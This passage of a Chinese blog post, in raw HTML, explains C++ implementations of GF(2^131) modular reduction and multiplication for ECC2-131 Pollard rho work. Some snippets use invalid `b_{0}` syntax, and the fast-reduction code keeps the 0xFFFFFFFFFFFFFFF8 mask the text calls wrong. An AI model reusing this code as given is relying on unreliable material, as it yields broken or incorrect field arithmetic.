class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"mord mtight\">6</span><span class=\"mord mtight\">0</span></span></span></span></span></span></span></span></span></span></span></span> 的每一位对 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>f</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">f(x)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span></span></span></span> 除法的余部都是固定的，那么可以提前算出这些余部，实际取模的时候就只需要查表就可以了。如下是一个打印格式为  <code>z^132 mod f(z) = ... </code>  的输出 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>x</mi><mn>131</mn></msup></mrow><annotation encoding=\"application/x-tex\">x^{131}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">3</span><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span></span></span></span> 到 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>x</mi><mn>260</mn></msup></mrow><annotation encoding=\"application/x-tex\">x^{260}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"mord mtight\">6</span><span class=\"mord mtight\">0</span></span></span></span></span></span></span></span></span></span></span></span> 的每一位对 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>f</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">f(x)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span></span></span></span> 除法的余部的程序：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;vector&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;numeric&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;algorithm&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"></span><br><span class=\"line\">FILE *output, *input;</span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">int</span> k = <span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">int</span> highest = <span class=\"number\">260</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">highest_degree</span><span class=\"params\">(<span class=\"type\">uint64_t</span> a[k])</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> j=k - <span class=\"number\">1</span>; j&gt;=<span class=\"number\">0</span>; --j)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">63</span>; i&gt;=<span class=\"number\">0</span>; --i)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(a[j] &amp; (<span class=\"number\">1ULL</span> &lt;&lt; i))&#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"number\">64</span> * j + i;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// x^131 + x^13 + x^2 + x + 1</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">ls_mod</span><span class=\"params\">(<span class=\"type\">uint64_t</span> t[k], <span class=\"type\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">    t[(<span class=\"number\">131</span> + n) / <span class=\"number\">64</span>] |= <span class=\"number\">1ULL</span> &lt;&lt; ((<span class=\"number\">131</span> + n) % <span class=\"number\">64</span>);</span><br><span class=\"line\">    t[(<span class=\"number\">13</span> + n) / <span class=\"number\">64</span>] |= <span class=\"number\">1ULL</span> &lt;&lt; ((<span class=\"number\">13</span> + n) % <span class=\"number\">64</span>);</span><br><span class=\"line\">    t[(<span class=\"number\">2</span> + n) / <span class=\"number\">64</span>] |= <span class=\"number\">1ULL</span> &lt;&lt; ((<span class=\"number\">2</span> + n) % <span class=\"number\">64</span>);</span><br><span class=\"line\">    t[(<span class=\"number\">1</span> + n) / <span class=\"number\">64</span>] |= <span class=\"number\">1ULL</span> &lt;&lt; ((<span class=\"number\">1</span> + n) % <span class=\"number\">64</span>);</span><br><span class=\"line\">    t[n / <span class=\"number\">64</span>] |= <span class=\"number\">1ULL</span> &lt;&lt; (n % <span class=\"number\">64</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">modular_reduction</span><span class=\"params\">(<span class=\"type\">uint64_t</span> r[k], <span class=\"type\">int</span> h)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(h &gt; <span class=\"number\">130</span>)&#123;</span><br><span class=\"line\">        <span class=\"type\">uint64_t</span> t[k] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">        <span class=\"built_in\">ls_mod</span>(t, h - <span class=\"number\">131</span>);</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>; i&lt;k; ++i)&#123;</span><br><span class=\"line\">            r[i] ^= t[i];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        h = <span class=\"built_in\">highest_degree</span>(r);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    output = <span class=\"built_in\">freopen</span>(<span class=\"string\">&quot;reducted&quot;</span>, <span class=\"string\">&quot;w&quot;</span>, stdout);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">131</span>; i&lt;=highest; ++i)&#123;</span><br><span class=\"line\">\t\t<span class=\"type\">uint64_t</span> r[k] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t\tr[i / <span class=\"number\">64</span>] ^= (<span class=\"number\">1ULL</span> &lt;&lt; (i % <span class=\"number\">64</span>));</span><br><span class=\"line\">\t\t<span class=\"built_in\">modular_reduction</span>(r, i);</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;z^%d mod f(z) = &quot;</span>, i);</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> j=<span class=\"number\">130</span>; j&gt;=<span class=\"number\">0</span>; --j)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(r[j / <span class=\"number\">64</span>] &amp; (<span class=\"number\">1ULL</span> &lt;&lt; (j % <span class=\"number\">64</span>)))&#123;</span><br><span class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;z^%d + &quot;</span>, j);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">fseek</span>(output, <span class=\"number\">-3</span>, SEEK_END);</span><br><span class=\"line\">        <span class=\"built_in\">fputc</span>(<span class=\"string\">&#x27;   &#x27;</span>, output);</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">\t  &#125;</span><br><span class=\"line\">    <span class=\"built_in\">fclose</span>(output);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>类似的，调整输出格式可以直接复制粘贴到源代码中组成一个固定的数组常量  <code>modular_reduction</code> ：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">uint64_t</span> modular_reduction[<span class=\"number\">130</span>][<span class=\"number\">3</span>] = &#123;</span><br><span class=\"line\">\t&#123; <span class=\"number\">0x0000000000002007</span>, <span class=\"number\">0x0000000000000000</span>, <span class=\"number\">0x0000000000000000</span> &#125;, <span class=\"comment\">// x^131</span></span><br><span class=\"line\">\t&#123; <span class=\"number\">0x000000000000400E</span>, <span class=\"number\">0x0000000000000000</span>, <span class=\"number\">0x0000000000000000</span> &#125;,</span><br><span class=\"line\">\t&#123; <span class=\"number\">0x000000000000801C</span>, <span class=\"number\">0x0000000000000000</span>, <span class=\"number\">0x0000000000000000</span> &#125;,</span><br><span class=\"line\">\t&#123; <span class=\"number\">0x0000000000010038</span>, <span class=\"number\">0x0000000000000000</span>, <span class=\"number\">0x0000000000000000</span> &#125;,</span><br><span class=\"line\">\t&#123; <span class=\"number\">0x0000000000020070</span>, <span class=\"number\">0x0000000000000000</span>, <span class=\"number\">0x0000000000000000</span> &#125;,</span><br><span class=\"line\">\t&#123; <span class=\"number\">0x00000000000400E0</span>, <span class=\"number\">0x0000000000000000</span>, <span class=\"number\">0x0000000000000000</span> &#125;,</span><br><span class=\"line\">\t&#123; <span class=\"number\">0x00000000000801C0</span>, <span class=\"number\">0x0000000000000000</span>, <span class=\"number\">0x0000000000000000</span> &#125;,</span><br><span class=\"line\">\t&#123; <span class=\"number\">0x0000000000100380</span>, <span class=\"number\">0x0000000000000000</span>, <span class=\"number\">0x0000000000000000</span> &#125;,</span><br><span class=\"line\">\t&#123; <span class=\"number\">0x0000000000200700</span>, <span class=\"number\">0x0000000000000000</span>, <span class=\"number\">0x0000000000000000</span> &#125;,</span><br><span class=\"line\">\t<span class=\"comment\">// ......</span></span><br><span class=\"line\">\t&#123; <span class=\"number\">0x0000000001001807</span>, <span class=\"number\">0x0000000000000000</span>, <span class=\"number\">0x0000000000000006</span> &#125;, <span class=\"comment\">// x^260</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>取模运算查表版的 trival 实现：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// mod x^131 + x^13 + x^2 + x + 1</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">gf_mod</span><span class=\"params\">(<span class=\"type\">uint64_t</span> b[<span class=\"number\">3</span>], <span class=\"type\">uint64_t</span> e[<span class=\"number\">5</span>])</span></span>&#123;</span><br><span class=\"line\">    b_&#123;<span class=\"number\">0</span>&#125; = e[<span class=\"number\">0</span>];</span><br><span class=\"line\">    b_&#123;<span class=\"number\">1</span>&#125; = e[<span class=\"number\">1</span>];</span><br><span class=\"line\">    b_&#123;<span class=\"number\">2</span>&#125; = e[<span class=\"number\">2</span>];</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">260</span>; i&gt;<span class=\"number\">130</span>; --i)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(e[i / <span class=\"number\">64</span>] &amp; (<span class=\"number\">1ULL</span> &lt;&lt; (i % <span class=\"number\">64</span>)))&#123;</span><br><span class=\"line\">            b_&#123;<span class=\"number\">0</span>&#125; ^= modular_reduction[i - <span class=\"number\">131</span>][<span class=\"number\">0</span>];</span><br><span class=\"line\">            b_&#123;<span class=\"number\">1</span>&#125; ^= modular_reduction[i - <span class=\"number\">131</span>][<span class=\"number\">1</span>];</span><br><span class=\"line\">            b_&#123;<span class=\"number\">2</span>&#125; ^= modular_reduction[i - <span class=\"number\">131</span>][<span class=\"number\">2</span>];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t  b_&#123;<span class=\"number\">2</span>&#125; &amp;= <span class=\"number\">7ULL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这里一共需要 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>130</mn><mo>×</mo><mn>3</mn><mo>=</mo><mn>390</mn></mrow><annotation encoding=\"application/x-tex\">130\\times3=390</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">1</span><span class=\"mord\">3</span><span class=\"mord\">0</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">3</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">3</span><span class=\"mord\">9</span><span class=\"mord\">0</span></span></span></span> 次异或运算。</p>\n<h2 id=\"快速取模\"><a class=\"anchor\" href=\"#快速取模\">#</a> 快速取模</h2>\n<p>参考 <a href=\"\">ECC2-131 的并行 Pollard rho 算法实现分析</a> 第 57 页的快速取模原理：</p>\n<p><img data-src=\"https://s2.loli.net/2025/01/04/STN76nGOh2lEMtR.png\" alt=\"\" /></p>\n<p>参考论文中的伪代码：</p>\n<p><img data-src=\"/assets/math/cryptography/finite-field/2.png\" alt=\"dasda\" /></p>\n<p>论文中快速取模算法伪码中的掩码  <code>0xFFFFFFFFFFFFFFF8</code>  错误，应该修改为  <code>0xFFFFFFFFFFFFFFFC</code> ，实现如下：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// mod x^131 + x^13 + x^2 + x + 1</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">gf_mod</span><span class=\"params\">(<span class=\"type\">uint64_t</span> b[<span class=\"number\">4</span>], <span class=\"type\">uint64_t</span> e[<span class=\"number\">5</span>])</span></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> t;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">4</span>; i&gt;=<span class=\"number\">3</span>; --i)&#123;</span><br><span class=\"line\">        t = e[i];</span><br><span class=\"line\">        e[i - <span class=\"number\">3</span>] ^= (t &lt;&lt; <span class=\"number\">61</span>) ^ (t &lt;&lt; <span class=\"number\">62</span>) ^ (t &lt;&lt; <span class=\"number\">63</span>);</span><br><span class=\"line\">        e[i - <span class=\"number\">2</span>] ^= (t &lt;&lt; <span class=\"number\">10</span>) ^ (t &gt;&gt; <span class=\"number\">1</span>) ^ (t &gt;&gt; <span class=\"number\">2</span>) ^ (t &gt;&gt; <span class=\"number\">3</span>);</span><br><span class=\"line\">        e[i - <span class=\"number\">1</span>] ^= (t &gt;&gt; <span class=\"number\">54</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    t = e[<span class=\"number\">2</span>] &amp; <span class=\"number\">0xFFFFFFFFFFFFFFF8</span>;</span><br><span class=\"line\">    b_&#123;<span class=\"number\">0</span>&#125; = e[<span class=\"number\">0</span>] ^ (t &lt;&lt; <span class=\"number\">10</span>) ^ (t &gt;&gt; <span class=\"number\">1</span>) ^ (t &gt;&gt; <span class=\"number\">2</span>) ^ (t &gt;&gt; <span class=\"number\">3</span>);</span><br><span class=\"line\">    b_&#123;<span class=\"number\">1</span>&#125; = e[<span class=\"number\">1</span>] ^ (t &gt;&gt; <span class=\"number\">54</span>);</span><br><span class=\"line\">    b_&#123;<span class=\"number\">2</span>&#125; = e[<span class=\"number\">2</span>] &amp; <span class=\"number\">0x7</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"乘法\"><a class=\"anchor\" href=\"#乘法\">#</a> 乘法</h1>\n<h2 id=\"trival-3\"><a class=\"anchor\" href=\"#trival-3\">#</a> Trival</h2>\n<p>最 Trival 的做法就是自己手搓一个乘法，配合前面 Trival 版的取模的话，就可以在乘法实现的过程查表消去高位来取模。</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// c = a * b</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">gf_mul</span><span class=\"params\">(<span class=\"type\">uint64_t</span> c[<span class=\"number\">3</span>], <span class=\"type\">const</span> <span class=\"type\">uint64_t</span> a[<span class=\"number\">3</span>], <span class=\"type\">const</span> <span class=\"type\">uint64_t</span> b[<span class=\"number\">3</span>])</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> e[<span class=\"number\">5</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">131</span>; ++i)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">int</span> j=<span class=\"number\">0</span>; j&lt;<span class=\"number\">131</span>; ++j)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(</span><br><span class=\"line\">                ((<span class=\"number\">1ULL</span> &lt;&lt; (i % <span class=\"number\">64</span>)) &amp; a[i / <span class=\"number\">64</span>]) &amp;&amp;</span><br><span class=\"line\">                ((<span class=\"number\">1ULL</span> &lt;&lt; (j % <span class=\"number\">64</span>)) &amp; b[j / <span class=\"number\">64</span>])</span><br><span class=\"line\">            )&#123;</span><br><span class=\"line\">                e[(i + j) / <span class=\"number\">64</span>] ^= (<span class=\"number\">1ULL</span> &lt;&lt; ((i + j) % <span class=\"number\">64</span>));</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (i + j &lt; <span class=\"number\">131</span>) &#123;</span><br><span class=\"line\">                    c[(i + j) / <span class=\"number\">64</span>] ^= (<span class=\"number\">1ULL</span> &lt;&lt; ((i + j) % <span class=\"number\">64</span>));</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    c[<span class=\"number\">0</span>] ^= modular_reduction[i + j - <span class=\"number\">131</span>][<span class=\"number\">0</span>];</span><br><span class=\"line\">                    c[<span class=\"number\">1</span>] ^= modular_reduction[i + j - <span class=\"number\">131</span>][<span class=\"number\">1</span>];</span><br><span class=\"line\">                    c[<span class=\"number\">2</span>] ^= modular_reduction[i + j - <span class=\"number\">131</span>][<span class=\"number\">2</span>];</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这里就需要做 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>131</mn><mo>×</mo><mn>131</mn></mrow><annotation encoding=\"application/x-tex\">131\\times131</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">1</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span><span class=\"mord\">3</span><span class=\"mord\">1</span></span></span></span> 次判断，性能相当的差，无法 AC。</p>\n<h2 id=\"pclmulqdq-优化\"><a class=\"anchor\" href=\"#pclmulqdq-优化\">#</a> PCLMULQDQ 优化</h2>\n<p><code>_mm_clmulepi64_si128</code>  指令可以将 2 个 64 位数相乘得到一个 128 位的数，这也是 64 位机器所能做的乘法，所以将数按 64 位分为 3 部分，有：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>a</mi><mo>=</mo><msub><mi>a</mi><mn>2</mn></msub><msup><mi>x</mi><mn>128</mn></msup><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><msup><mi>x</mi><mn>64</mn></msup><mo>+</mo><msub><mi>a</mi><mn>0</mn></msub><mspace linebreak=\"newline\"></mspace><mi>b</mi><mo>=</mo><msub><mi>b</mi><mn>2</mn></msub><msup><mi>x</mi><mn>128</mn></msup><mo>+</mo><msub><mi>b</mi><mn>1</mn></msub><msup><mi>x</mi><mn>64</mn></msup><mo>+</mo><msub><mi>b</mi><mn>0</mn></msub></mrow><annotation encoding=\"application/x-tex\">a=a_{2}x^{128}+a_{1}x^{64}+a_{0}\\\\\nb=b_{2}x^{128}+b_{1}x^{64}+b_{0}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.0141079999999998em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">2</span><span class=\"mord mtight\">8</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.0141079999999998em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" 